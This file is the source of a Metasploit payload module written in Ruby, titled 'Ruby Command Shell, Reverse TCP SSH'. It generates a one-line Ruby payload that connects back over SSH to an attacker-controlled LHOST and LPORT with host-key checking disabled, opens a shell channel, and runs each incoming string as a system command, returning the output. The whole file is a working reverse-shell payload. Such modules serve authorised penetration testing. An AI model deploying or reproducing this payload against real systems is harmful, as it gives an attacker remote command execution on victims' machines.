##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/ruby'
require 'msf/core/handler/reverse_ssh'
require 'msf/base/sessions/ssh_command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Ruby
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Ruby Command Shell, Reverse TCP SSH',
      'Description' => 'Connect back and create a command shell via Ruby, uses SSH',
      'Author'      => 'RageLtMan',
      'License'     => MSF_LICENSE,
      'Platform'    => 'ruby',
      'Arch'        => ARCH_RUBY,
      'Handler'     => Msf::Handler::ReverseSsh,
      'Session'     => Msf::Sessions::SshCommandShell,
      'PayloadType' => 'ruby',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    rbs = prepends(ruby_string)
    vprint_good rbs
    return rbs
  end

  def ruby_string
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    rbs = "Net::SSH.start(\"#{lhost}\",#{datastore['LPORT']},paranoid:false)"
    rbs << '{|s|s.open_channel{|c|c.request_pty{|a|a.send_channel_request("shell")};'
    rbs << 'c.on_data{|a,d|begin;c.send_data(`#{d}`);rescue;end}};s.loop}'
    return rbs
  end
end
